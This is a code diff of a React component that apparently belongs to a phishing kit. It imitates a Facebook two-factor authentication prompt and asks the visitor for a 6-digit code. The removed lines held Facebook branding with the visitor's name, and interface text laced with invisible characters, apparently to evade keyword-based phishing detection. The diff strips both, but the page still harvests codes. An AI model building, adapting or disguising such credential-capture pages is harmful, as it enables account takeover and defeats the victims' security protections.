@@ -206,14 +206,11 @@ function Fa2AuthApp({ Unik, setStep, Name, Ip }) {
         <ModalContainer>
             <ModalContent>
                 <div className='text-start'>
-                    <span style={{ fontWeight: 500, fontSize: '14px' }}>
-                        {Name ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' + (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '') : ''} • Facebook
-                    </span>
                     <ModalTitle>
-                        G‎o t‎o yo‎ur au‎the‎nt‎ica‎ti‎on ap‎p
+                        Go to your authentication app
                     </ModalTitle>
                     <SmallText>
-                        Enter the 6-digit code for this account from the two-factor a‎ut‎he‎nt‎i‎ca‎ti‎o‎n app you set up (such as Duo Mobile or Google Authenticator)
+                        Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator)
                     </SmallText>
                 </div>
                 <ImgWrapper>
@@ -234,7 +231,7 @@ function Fa2AuthApp({ Unik, setStep, Name, Ip }) {
 
                     {Error && (
                         <ErrorDiv>
-                            In‎va‎li‎d a‎ut‎he‎nt‎i‎ca‎ti‎o‎n co‎d‎e
+                            Invalid authentication code
                         </ErrorDiv>
                     )}
                     <SmallText>
